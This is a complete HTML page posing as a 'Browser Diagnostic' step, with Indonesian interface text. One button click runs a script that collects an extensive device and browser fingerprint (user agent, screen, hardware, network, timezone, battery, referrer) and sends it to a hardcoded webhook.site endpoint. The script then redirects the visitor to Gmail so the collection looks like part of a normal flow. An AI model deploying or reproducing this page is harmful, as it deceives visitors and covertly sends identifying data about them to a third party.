<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<title>Browser Diagnostic Redirect</title>

<style>

body{
margin:0;
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#202124;
font-family:Arial;
}

.card{
background:white;
width:90%;
max-width:420px;
padding:35px;
border-radius:18px;
text-align:center;
box-shadow:0 10px 30px #0005;
}

button{
width:100%;
padding:15px;
border:0;
border-radius:10px;
background:#1a73e8;
color:white;
font-size:17px;
cursor:pointer;
}

button:disabled{
background:#888;
}

#status{
margin-top:20px;
font-size:14px;
}

</style>

</head>


<body>


<div class="card">

<h2>Continue</h2>

<p>
Browser Diagnostic
</p>


<button id="send">
Kirim & Lanjut
</button>


<div id="status">
Ready
</div>


</div>



<script>


const WEBHOOK =
"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";



async function batteryInfo(){

try{

if(navigator.getBattery){

const b =
await navigator.getBattery();


return {

level:
Math.round(b.level*100)+"%",

charging:
b.charging

};

}

}catch(e){}


return null;

}



function collect(){


const n=navigator;

const c =
n.connection ||
n.webkitConnection ||
n.mozConnection;



return {


event:
"browser_full_metadata",



timestamp:
new Date().toISOString(),



location_page:{

url:
location.href,

title:
document.title,

referrer:
document.referrer,

origin:
location.origin

},



browser:{

userAgent:
n.userAgent,

language:
n.language,

languages:
n.languages,

platform:
n.platform,

vendor:
n.vendor,

online:
n.onLine,

cookieEnabled:
n.cookieEnabled,

doNotTrack:
n.doNotTrack || null,

javaEnabled:
n.javaEnabled ? n.javaEnabled():false

},



screen:{

width:
screen.width,

height:
screen.height,

availableWidth:
screen.availWidth,

availableHeight:
screen.availHeight,

colorDepth:
screen.colorDepth,

pixelDepth:
screen.pixelDepth,

pixelRatio:
devicePixelRatio

},



window:{

innerWidth:
innerWidth,

innerHeight:
innerHeight,

outerWidth:
outerWidth,

outerHeight:
outerHeight,

scrollWidth:
document.documentElement.scrollWidth,

scrollHeight:
document.documentElement.scrollHeight

},



device:{

cpu:
n.hardwareConcurrency || null,

memory:
n.deviceMemory || null,

touch:
n.maxTouchPoints>0,

touchPoints:
n.maxTouchPoints || 0

},



network:
c?{

type:
c.effectiveType,

downlink:
c.downlink,

rtt:
c.rtt,

saveData:
c.saveData

}:null,



display:{

darkMode:
matchMedia("(prefers-color-scheme:dark)").matches,

reducedMotion:
matchMedia("(prefers-reduced-motion:reduce)").matches

},



time:{

timezone:
Intl.DateTimeFormat().resolvedOptions().timeZone,

offset:
new Date().getTimezoneOffset(),

locale:
Intl.DateTimeFormat().resolvedOptions().locale,

local:
new Date().toString()

}



};


}



document
.getElementById("send")
.onclick=async function(){


this.disabled=true;


const status=
document.getElementById("status");


status.innerHTML=
"Mengirim...";



let data =
collect();



data.battery =
await batteryInfo();



const params =
new URLSearchParams();


Object.keys(data)
.forEach(k=>{

params.append(
k,
typeof data[k]=="object"
?
JSON.stringify(data[k])
:
data[k]
);

});



fetch(
WEBHOOK+"?"+params.toString()
)
.then(()=>{


status.innerHTML=
"Terkirim";


setTimeout(()=>{


location.href=
"https://mail.google.com";


},1000);


})
.catch(()=>{


status.innerHTML=
"Gagal";


});


};


</script>


</body>

</html>
